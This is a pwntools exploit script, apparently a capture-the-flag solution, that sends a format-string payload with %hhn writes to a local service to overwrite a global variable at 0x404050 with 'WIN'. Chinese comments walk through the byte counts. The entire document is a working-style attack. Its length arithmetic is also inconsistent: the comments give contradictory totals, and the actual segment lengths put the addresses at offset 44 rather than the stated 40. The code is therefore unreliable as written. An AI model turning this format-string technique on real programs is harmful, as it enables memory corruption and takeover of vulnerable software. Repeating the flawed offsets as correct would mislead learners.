#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13373
r = remote(HOST, PORT)

context.arch = 'amd64'

# target 全局变量地址（No PIE）
target = 0x404050  # target[0]='W'(0x57), [1]='I'(0x49), [2]='N'(0x4e)

# 格式化字符串：全部用位置参数，payload 总长度对齐到 8 字节倍数
# 地址放在 buf+40 处，对应 %11$、%12$、%13$
#
# 写入顺序：先写 0x49(I) 到 target+1，再写 0x4e(N) 到 target+2，最后写 0x57(W) 到 target+0
# 利用 %hhn 逐字节写，每次写的是当前已输出字符数的低 8 位
#
# 初始输出字符数 = 0
# %1$73c  -> 输出 73 字符 -> 写 0x49 到 target+1  (%11$hhn)
# %1$5c   -> 再输出 5     -> 总 78=0x4e，写到 target+2 (%12$hhn)
# %1$9c   -> 再输出 9     -> 总 87=0x57，写到 target+0 (%13$hhn)
# 前缀共 13+5+5+3 = 26 字节，pad 到 40 字节，后跟三个 8 字节地址

fmt  = b'%1$73c%11$hhn'   # 13 bytes
fmt += b'%1$5c%12$hhn'    # 10 bytes  -> total 23
fmt += b'%1$9c%13$hhn'    # 10 bytes  -> total 33
fmt += b'X' * 7           # pad to 40 bytes
fmt += p64(target + 1)    # %11$
fmt += p64(target + 2)    # %12$
fmt += p64(target + 0)    # %13$

r.send(fmt)
r.interactive()
